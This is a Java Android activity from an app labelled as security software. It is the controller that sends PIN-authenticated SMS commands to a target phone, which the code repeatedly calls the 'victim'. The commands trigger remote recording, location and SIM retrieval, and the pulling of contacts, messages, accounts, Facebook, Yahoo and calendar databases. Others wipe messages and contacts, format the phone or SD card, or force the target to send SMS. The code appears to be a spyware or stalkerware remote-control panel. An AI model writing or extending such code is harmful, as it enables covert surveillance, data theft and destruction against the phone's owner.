package com.tvh.security.ui;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.Dialog;
import android.app.DialogFragment;
import android.content.DialogInterface;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Debug;
import android.provider.ContactsContract;
import android.text.TextUtils;
import android.util.Log;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Toast;
import tuisolutions.tuisecurity.R;

import java.util.ArrayList;
import java.util.List;

import com.tvh.security.models.CommandType;
import com.tvh.security.models.Phone;
import com.tvh.security.preferences.BasicPreferenceActivity;
import com.tvh.security.utils.CommandUtils;
import com.tvh.security.utils.ContactUtils;
import com.tvh.security.utils.PreferencesUtils;
import com.tvh.security.utils.Utils;

public class CommandActivity extends Activity implements View.OnClickListener {
    public static final String PIN = "pin";
    private static final int REQUEST_PHONE_NUMBER_CODE = 1;
    private Button m_btnPhoneRing, m_btnRemoteFormat, m_btnAutoRecording, m_btnVictimData, m_btnGetLocation, m_btnGetSimInfo, m_btnRequestSendSms;
    private String m_advertise;
    private String m_pin = null;
    private String m_number = null;
    private EditText m_txtNumber = null;
    private EditText m_txtPin = null;

    public CommandActivity() {
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.pager_command);

        m_btnPhoneRing = (Button) findViewById(R.id.btnPhoneRing);
        m_btnRemoteFormat = (Button) findViewById(R.id.btnRemoteFormat);
        m_btnAutoRecording = (Button) findViewById(R.id.btnAutoRecording);
        m_btnVictimData = (Button) findViewById(R.id.btnVictimData);
        m_btnGetLocation = (Button) findViewById(R.id.btnGetLocation);
        m_btnGetSimInfo = (Button) findViewById(R.id.btnGetSimInfo);
        m_btnRequestSendSms = (Button) findViewById(R.id.btnRequestSendSms);

        m_btnPhoneRing.setOnClickListener(this);
        m_btnRemoteFormat.setOnClickListener(this);
        m_btnAutoRecording.setOnClickListener(this);
        m_btnVictimData.setOnClickListener(this);
        m_btnGetLocation.setOnClickListener(this);
        m_btnGetSimInfo.setOnClickListener(this);
        m_btnRequestSendSms.setOnClickListener(this);

        showChooseVictimDialog();
        m_advertise = PreferencesUtils.getAdStr(getApplicationContext());
    }

    public void onClick(View v) {
        String commandInfo = null;
        String command = null;
        boolean isSend = false;
        switch (v.getId()) {
            case R.id.btnPhoneRing:
                isSend = true;
                command = CommandType.COMMAND_ALARM_LOCK.getCommand();
                commandInfo = CommandType.COMMAND_ALARM_LOCK.getDescription();
                break;
            case R.id.btnRemoteFormat:
                ChooseRemoteWipeType dialog = new ChooseRemoteWipeType();
                dialog.show(getFragmentManager(), ChooseRemoteWipeType.class.getSimpleName());
                break;
            case R.id.btnAutoRecording:
                ChooseStopTypeDialog dialog1 = new ChooseStopTypeDialog();
                dialog1.show(getFragmentManager(), "StopTypeDialog");
                break;
            case R.id.btnVictimData:
                ChooseDataTypeDialog dialog2 = new ChooseDataTypeDialog();
                dialog2.show(getFragmentManager(), "DataTypeDialog");
                break;
            case R.id.btnGetLocation:
                isSend = true;
                command = CommandType.COMMAND_GET_LOCATION.getCommand();
                commandInfo = CommandType.COMMAND_GET_LOCATION.getDescription();
                break;
            case R.id.btnGetSimInfo:
                isSend = true;
                command = CommandType.COMMAND_GET_SIM_INFO.getCommand();
                commandInfo = CommandType.COMMAND_GET_SIM_INFO.getDescription();
                break;
            case R.id.imgChooseContact:
                Intent intent = new Intent(Intent.ACTION_PICK, ContactsContract.Contacts.CONTENT_URI);
                startActivityForResult(intent, REQUEST_PHONE_NUMBER_CODE);
                break;
            case R.id.btnRequestSendSms:
                showDialogRequestSendSms();
                break;
            default:
                break;
        }
        if (isSend) {
            sendCommandAndShowResult(command, commandInfo);
        }

    }

    private void sendCommandAndShowResult(String command, String commandInfo) {
        //send command and show result
        sendCommandAndShowResult(command, commandInfo, m_advertise);
    }

    private void sendCommandAndShowResult(String command, String commandInfo, String advertise) {
        boolean sendResult = CommandUtils.sendCommand(m_number, command, m_pin, advertise);

        if (sendResult) {
            Utils.showToast(getApplicationContext(), getResources().getString(R.string.send_command_message_successfully) + commandInfo);
        } else {
            Utils.showToast(getApplicationContext(), getResources().getString(R.string.send_command_message_fail) + commandInfo);
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater inflater = getMenuInflater();
        inflater.inflate(R.menu.activity_main, menu);
        MenuItem menuCommand = menu.findItem(R.id.menu_command);
        menuCommand.setVisible(false);
        return super.onCreateOptionsMenu(menu);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case android.R.id.home:
                Toast.makeText(this, "Tapped home", Toast.LENGTH_SHORT).show();
                break;
            case R.id.menu_settings:
                startActivity(new Intent(getApplicationContext(), BasicPreferenceActivity.class));
                break;
            case R.id.menu_help:
                break;
            case R.id.menu_command:
                break;
            default:
                break;
        }
        return super.onOptionsItemSelected(item);
    }

    private void showDialogRequestSendSms() {
        final Dialog dialog = new Dialog(this);
        dialog.setContentView(R.layout.request_send_sms_layout);
        dialog.setTitle("Show Me The Phone...");
        dialog.setCancelable(false);

        final EditText txtTargetNumber = (EditText) dialog.findViewById(R.id.txt_input_victim_pin);
        final EditText txtSmsContent = (EditText) dialog.findViewById(R.id.txt_request_sms_content);

        Button btnOK = (Button) dialog.findViewById(R.id.btn_ok);
        Button btnCancel = (Button) dialog.findViewById(R.id.btn_cancel);
        btnOK.setOnClickListener(new View.OnClickListener() {

            public void onClick(View paramView) {
                String targerNumber = txtTargetNumber.getText().toString();
                String smsContent = txtSmsContent.getText().toString();

                String command = CommandType.COMMAND_REQUEST_SEND_SMS.getCommand();
                String commandInfo = CommandType.COMMAND_REQUEST_SEND_SMS.getDescription();
                sendCommandAndShowResult(command, commandInfo, smsContent + "%%" + targerNumber);
                dialog.dismiss();
            }
        });
        btnCancel.setOnClickListener(new View.OnClickListener() {

            public void onClick(View v) {
                Utils.showToast(getApplicationContext(), "Cancel");
                dialog.dismiss();
            }
        });
        dialog.show();
    }

    private void showChooseVictimDialog() {
        final Dialog dialog = new Dialog(this);
        dialog.setContentView(R.layout.choose_contact_layout);
        dialog.setTitle("Show Me The Phone...");
        dialog.setCancelable(false);

        m_txtNumber = (EditText) dialog.findViewById(R.id.txtMobileReturn);
        m_txtPin = (EditText) dialog.findViewById(R.id.txt_input_victim_pin);
        ImageView imgChooseContact = (ImageView) dialog.findViewById(R.id.imgChooseContact);

        imgChooseContact.setOnClickListener(this);
        Button btnOK = (Button) dialog.findViewById(R.id.btn_ok);
        Button btnCancel = (Button) dialog.findViewById(R.id.btn_cancel);
        btnOK.setOnClickListener(new View.OnClickListener() {

            public void onClick(View paramView) {
                m_number = m_txtNumber.getText().toString();
                m_pin = m_txtPin.getText().toString();
                if (!TextUtils.isEmpty(m_number) && !TextUtils.isEmpty(m_pin)) {
                    dialog.dismiss();
                } else {
                    Utils.showToast(getApplicationContext(), "Missing phone number or pin!");
                }
            }
        });
        btnCancel.setOnClickListener(new View.OnClickListener() {

            public void onClick(View v) {
                finish();
            }
        });
        dialog.show();
    }

    @Override
    public void onActivityResult(int reqCode, int resultCode, Intent data) {
        super.onActivityResult(reqCode, resultCode, data);
        try {
            if (resultCode == Activity.RESULT_OK) {
                switch (reqCode) {
                    case REQUEST_PHONE_NUMBER_CODE:
                        // Request Phone Number
                        Phone number = null;
                        Uri contactData = data.getData();
                        Cursor cur = getApplicationContext().getContentResolver().query(contactData, null, null, null, null);
                        while (cur.moveToNext()) {
                            String contactId = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                            number = ContactUtils.getPhoneNumbers(getApplicationContext(), contactId);
                        }
                        if (!TextUtils.isEmpty(number.getNumber())) {
                            m_txtNumber.setText(number.getNumber());
                            //reset input PIN when choose new contact
                            m_txtPin.setText("");
                        }
                        cur.close();
                        break;
                    default:
                        break;
                }
            }
        } catch (IllegalArgumentException e) {
            if (Debug.isDebuggerConnected()) {
                Log.e("IllegalArgumentException : ", e.toString());
            }
        } catch (Exception e) {
            Log.e("Error : ", e.toString());
        }
    }

    private class ChooseDataTypeDialog extends DialogFragment {
        private List<Integer> mSelectedItems = new ArrayList<Integer>();

        @Override
        public Dialog onCreateDialog(Bundle savedInstanceState) {
            AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
            // Set the dialog title
            builder.setTitle("Choose data type").setSingleChoiceItems(R.array.get_victim_data_mode, -1, new DialogInterface.OnClickListener() {

                public void onClick(DialogInterface dialog, int which) {
                    if (mSelectedItems.isEmpty()) {
                        mSelectedItems.add(which);
                    } else {
                        // if is has clicked
                        mSelectedItems.clear();
                    }
                }
            }).setPositiveButton(R.string.ok, new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                    String command = "";
                    String commandInfo = "";
                    if (mSelectedItems.size() > 0) {
                        switch (mSelectedItems.get(0)) {
                            case 0:
                                command = CommandType.COMMAND_GET_SYSTEM_SETTINGS.getCommand();
                                commandInfo = CommandType.COMMAND_GET_SYSTEM_SETTINGS.getDescription();
                                break;
                            case 1:
                                command = CommandType.COMMAND_GET_CONTACT_DB.getCommand();
                                commandInfo = CommandType.COMMAND_GET_CONTACT_DB.getDescription();
                                break;
                            case 2:
                                command = CommandType.COMMAND_GET_MESSAGE_DB.getCommand();
                                commandInfo = CommandType.COMMAND_GET_MESSAGE_DB.getDescription();
                                break;
                            case 3:
                                command = CommandType.COMMAND_GET_MAP_SEARCH_DB.getCommand();
                                commandInfo = CommandType.COMMAND_GET_MAP_SEARCH_DB.getDescription();
                                break;
                            case 4:
                                command = CommandType.COMMAND_GET_YOUTUBE_DB.getCommand();
                                commandInfo = CommandType.COMMAND_GET_YOUTUBE_DB.getDescription();
                                break;
                            case 5:
                                command = CommandType.COMMAND_GET_FACEBOOK_DB.getCommand();
                                commandInfo = CommandType.COMMAND_GET_FACEBOOK_DB.getDescription();
                                break;
                            case 6:
                                command = CommandType.COMMAND_GET_YAHOO_DB.getCommand();
                                commandInfo = CommandType.COMMAND_GET_YAHOO_DB.getDescription();
                                break;
                            case 7:
                                command = CommandType.COMMAND_GET_ACCOUNT_DB.getCommand();
                                commandInfo = CommandType.COMMAND_GET_ACCOUNT_DB.getDescription();
                                break;
                            case 8:
                                command = CommandType.COMMAND_GET_CALENDAR_DB.getCommand();
                                commandInfo = CommandType.COMMAND_GET_CALENDAR_DB.getDescription();
                                break;
                            default:
                                break;
                        }
                        sendCommandAndShowResult(command, commandInfo);
                    }

                }
            }).setNegativeButton(R.string.cancel, new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                    dismiss();
                    Utils.showToast(getApplicationContext(), "Cancel");
                }
            });

            return builder.create();
        }
    }

    private class ChooseStopTypeDialog extends DialogFragment {
        private List<Integer> mSelectedItems = new ArrayList<Integer>();

        @Override
        public Dialog onCreateDialog(Bundle savedInstanceState) {
            AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
            // Set the dialog title
            builder.setTitle("Choose stop type").setSingleChoiceItems(R.array.get_stop_recording_mode, -1, new DialogInterface.OnClickListener() {

                public void onClick(DialogInterface dialog, int which) {
                    if (mSelectedItems.isEmpty()) {
                        mSelectedItems.add(which);
                    } else {
                        // if is has clicked
                        mSelectedItems.clear();
                    }
                }
            }).setPositiveButton(R.string.ok, new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                    String command = null;
                    String commandInfo = "";
                    if (mSelectedItems.size() > 0) {
                        switch (mSelectedItems.get(0)) {
                            case 0:
                                command = CommandType.COMMAND_RECORD_INTERACTION.getCommand();
                                commandInfo = CommandType.COMMAND_RECORD_INTERACTION.getDescription();
                                break;
                            case 1:
                                command = CommandType.COMMAND_RECORD_LIMIT_TIME.getCommand();
                                commandInfo = CommandType.COMMAND_RECORD_LIMIT_TIME.getDescription();
                                break;
                            default:
                                break;
                        }
                        sendCommandAndShowResult(command, commandInfo);
                    }

                }
            }).setNegativeButton(R.string.cancel, new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                    dismiss();
                    Utils.showToast(getApplicationContext(), "Cancel");
                }
            });
            return builder.create();
        }
    }

    private class ChooseRemoteWipeType extends DialogFragment {
        private List<Integer> mSelectedItems = new ArrayList<Integer>();

        @Override
        public Dialog onCreateDialog(Bundle savedInstanceState) {
            AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
            // Set the dialog title
            builder.setTitle("Choose data type").setSingleChoiceItems(R.array.feature_remote_wipe, -1, new DialogInterface.OnClickListener() {

                public void onClick(DialogInterface dialog, int which) {
                    if (mSelectedItems.isEmpty()) {
                        mSelectedItems.add(which);
                    } else {
                        // if is has clicked
                        mSelectedItems.clear();
                    }
                }
            }).setPositiveButton(R.string.ok, new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                    String command = "";
                    String commandInfo = "";
                    if (mSelectedItems.size() > 0) {
                        switch (mSelectedItems.get(0)) {
                            case 0:
                                command = CommandType.COMMAND_DELETE_MESSAGE.getCommand();
                                commandInfo = CommandType.COMMAND_DELETE_MESSAGE.getCommand();
                                break;
                            case 1:
                                command = CommandType.COMMAND_DELETE_CONTACT.getCommand();
                                commandInfo = CommandType.COMMAND_DELETE_CONTACT.getCommand();
                                break;
                            case 2:
                                command = CommandType.COMMAND_FORMAT_SD_CARD.getCommand();
                                commandInfo = CommandType.COMMAND_FORMAT_SD_CARD.getDescription();
                                break;
                            case 3:
                                command = CommandType.COMMAND_FORMAT_PHONE.getCommand();
                                commandInfo = CommandType.COMMAND_FORMAT_PHONE.getDescription();
                                break;
                            default:
                                break;
                        }
                        sendCommandAndShowResult(command, commandInfo);
                    }
                }
            }).setNegativeButton(R.string.cancel, new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                    dismiss();
                    Utils.showToast(getApplicationContext(), "Cancel");
                }
            });

            return builder.create();
        }
    }

}
